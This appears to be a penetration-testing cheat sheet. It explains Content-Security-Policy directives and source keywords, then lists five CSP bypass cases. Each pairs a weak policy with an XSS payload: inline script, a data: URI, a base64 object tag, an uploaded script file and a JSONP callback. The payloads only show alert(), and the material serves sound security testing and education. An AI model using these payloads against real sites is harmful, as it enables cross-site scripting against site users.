# Simple recap:

## Directives:
* **script-src**: this directive specifies allowed JavaScript sources like:
    * external scripts
    * inline scripts
    * evend handlers (eg. *onload*,*onerror*)
* **default-src**: this defines the default behaviour. When some directive are missing, the browser follows this directive by default
* The following directives define the allowed sources for specific data:
    * **img-src** defines allowed sources to load images on the page
    * **object-src** for objects (`<object>,<embed>,<applet>`) 
    * **frame-src** for frames
    * etc...

Below is the list of directives which will follow default-src value even though they are not defined in the policy:

```
child-src connect-src font-src frame-src img-src manifest-src
media-src object-src prefetch-src script-src script-src-elem
script-src-attr style-src style-src-elem style-src-attr worker-src
```

## Sources:
* **self**: the loading of resources on the page is allowed from the same domain
* **data**: the loading of resources via the data scheme (eg Base64 encoded values)
* **none**: this directive allows nothing to be loaded from any source
* **unsafe-eval**: this allows the use of *eval()* and similar methods
* **unsafe-inline**: this allows the use of inline resources (eg. `<script>,<style>`)
* **unsafe-hashes**: this allows to enable specific inline event handlers


<br><br>

# Examples:

Test the below CSP directives by using:
* https://cspscanner.com/
* https://csp-evaluator.withgoogle.com/

<br>

## CSP Bypass 1

```
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-inline' https://*; child-src 'none'; report-uri /Report-parsing-url;
```


The insecure *unsafe-inline* source allows us to use any inline payload like, for example:
* `"/><script>alert(1);</script>`

<br><br>

## CSP Bypass 2

```
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://*; child-src 'none'; report-uri /Report-parsing-url;
```

The above insecure CSP configuration (*script-src*) allows us to use the following payload:
* `<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ`
    * `YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ` is the base64 encoded value of : `alert(document.domain)` 

<br><br>


## CSP Bypass 3

```
Content-Security-Policy: script-src 'self' report-uri /Report-parsing-url;
```

We can see **object-src** and **default-src** are missing here. This allows us to inject the following payload:
* `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>`
    * where `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg` is the base64 encoded value of `<script>alert(1)</script> `


## CSP Bypass 4 

```
Content-Security-Policy: script-src 'self'; object-src 'none' ; report-uri /Report-parsing-url;
```

In this case, we can see **object-src** is *none*. We could inject *iframe* or *img* elements but, due to the *script-src self* declaration, we would not be allowed to execute JavaScript by adopting event handlers. However,*if the application allows users to upload any type of file to the host*, an attacker could upload any malicious script and call within any tag like, for example:

* `"/>'><script src="/user_upload/mypic.png.js"></script>`


# CSP Bypass 5

```
Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none' ; report-uri /Report-parsing-url;
```

When **script-src** is set to *self* and a particular domain is whitelisted, CSP can be bypassed using **jsonp**:

* `"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>`

* Ref: https://github.com/zigoo0/JSONBee






